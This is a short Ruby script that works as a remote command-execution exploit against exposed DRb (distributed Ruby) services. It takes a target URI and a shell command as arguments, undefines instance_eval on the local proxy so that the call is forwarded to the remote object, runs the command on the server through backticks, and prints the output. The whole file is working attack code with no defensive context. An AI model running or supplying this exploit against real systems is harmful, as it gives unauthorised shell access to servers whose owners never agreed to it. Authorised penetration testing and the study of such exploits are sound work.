require 'drb/drb'

DRb.start_service

ro = DRbObject::new_with_uri("druby://#{ARGV[0]}")
class << ro
  undef :instance_eval  # force call to be passed to remote object
end
out = ro.instance_eval("`#{ARGV[1]}`")

printf out
